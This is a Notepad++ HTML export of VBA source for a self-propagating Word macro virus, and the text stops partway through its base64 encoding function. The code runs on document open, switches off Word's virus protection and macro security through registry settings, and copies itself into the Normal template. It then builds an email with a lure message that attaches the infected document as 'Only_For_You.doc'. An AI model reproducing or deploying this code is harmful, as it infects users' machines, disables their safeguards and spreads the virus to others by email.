<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetUserName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetUserNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">


</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AutoOpen</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">FuckProtection</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InfectWord</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">CreateEML</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InfectWord</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">nor</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">NormalTemplate.VBProject.VBComponents</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">doc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ActiveDocument.VBProject.VBComponents</span><span class="sc0">
</span><span class="sc7">srcvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\calli.drv"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">nor.Item</span><span class="sc6">(</span><span class="sc4">"Calli"</span><span class="sc6">).</span><span class="sc7">Name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Calli"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">doc</span><span class="sc6">(</span><span class="sc4">"Calli"</span><span class="sc6">).</span><span class="sc7">Export</span><span class="sc0"> </span><span class="sc7">srcvir</span><span class="sc0">
    </span><span class="sc7">nor.Import</span><span class="sc0"> </span><span class="sc7">srcvir</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">doc.Item</span><span class="sc6">(</span><span class="sc4">"Calli"</span><span class="sc6">).</span><span class="sc7">Name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Calli"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">nor</span><span class="sc6">(</span><span class="sc4">"Calli"</span><span class="sc6">).</span><span class="sc7">Export</span><span class="sc0"> </span><span class="sc7">srcvir</span><span class="sc0">
    </span><span class="sc7">doc.Import</span><span class="sc0"> </span><span class="sc7">srcvir</span><span class="sc0">
    </span><span class="sc7">ActiveDocument.Save</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">srcvir</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">FuckProtection</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">With</span><span class="sc0"> </span><span class="sc7">Options</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">ConfirmConversions</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">VirusProtection</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc6">.</span><span class="sc7">SaveNormalPrompt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">With</span><span class="sc0">
</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">Application.Version</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"10.0"</span><span class="sc0">
    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"AccessVBOM"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"9.0"</span><span class="sc0">
    </span><span class="sc7">System.PrivateProfileString</span><span class="sc6">(</span><span class="sc4">""</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Level"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">&amp;</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
</span><span class="sc7">WordBasic.DisableAutoMacros</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">CreateEML</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">strUserName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">strUserName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">(</span><span class="sc2">100</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr$</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">GetUserName</span><span class="sc0"> </span><span class="sc7">strUserName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc7">strUserName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">strUserName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">strUserName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr$</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">


</span><span class="sc7">bound</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Timer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">bound</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">bound</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">eml1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"To: """</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">strUserName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"@microsoft.com"""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Subject: Hello You..."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Date: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Hour</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">":"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Minute</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">":"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Second</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" +0200"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"MIME-Version: 1.0"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Type: multipart/mixed;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">vbTab</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"boundary = ""----=_NextPart_"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">bound</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"X-Priority: 3"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"X -MSMail - Priority: Normal"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"X-Unsent: 1"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"This is a multi-part message in MIME format."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
        
</span><span class="sc7">eml2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"------=_NextPart_"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">bound</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Type: text/plain;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">vbTab</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Charset=""iso-8859-1"""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Transfer-Encoding: 7bit"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Hello my friend, this is a funny file for you"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">vbTab</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbTab</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Best Regards"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">

</span><span class="sc7">eml3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"------=_NextPart_"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">bound</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Type: application/x-msdownload;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">vbTab</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"name = ""Only_For_You.doc"""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content -Transfer - Encoding: base64"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Disposition: attachment;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">vbTab</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"fileName = ""Only_For_You.doc"""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">

</span><span class="sc7">eml4</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EncodeBase64</span><span class="sc6">(</span><span class="sc7">ActiveDocument.FullName</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">eml5</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"------=_NextPart_"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">bound</span><span class="sc0">

</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc4">"hello.eml"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">eml1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">eml2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">eml3</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">eml4</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">eml5</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EncodeBase64</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">vsFullPathname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Base64Tab</span><span class="sc0">   </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">      </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0">      </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0">     </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">n</span><span class="sc0">           </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    
    </span><span class="sc7">Base64Tab</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"A"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"B"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"D"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"E"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"F"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"G"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"H"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"I"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"J"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"K"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"L"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"M"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"N"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"O"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"P"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Q"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"R"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"S"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"T"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"V"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"W"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"X"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Y"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Z"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"a"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"b"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"c"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"d"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"e"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"f"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"g"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"h"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"i"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"j"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"k"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"l"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"m"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"n"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"o"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"p"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"q"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"r"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"s"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"t"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"u"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"v"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"w"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"x"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"y"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"z"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"0"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"3"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"4"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"5"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"6"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"7"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"8"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"9"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"+"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc6">)</span><span class="sc0">
    
    </span><span class="sc3">Erase</span><span class="sc0"> </span><span class="sc7">bin</span><span class="sc0">
    </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0">
    </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    
    </span><span class="sc7">FileIn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">
    
    </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vsFullPathname</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc0">
    
    </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
    </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    
    </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">FileIn</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Mod</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
    
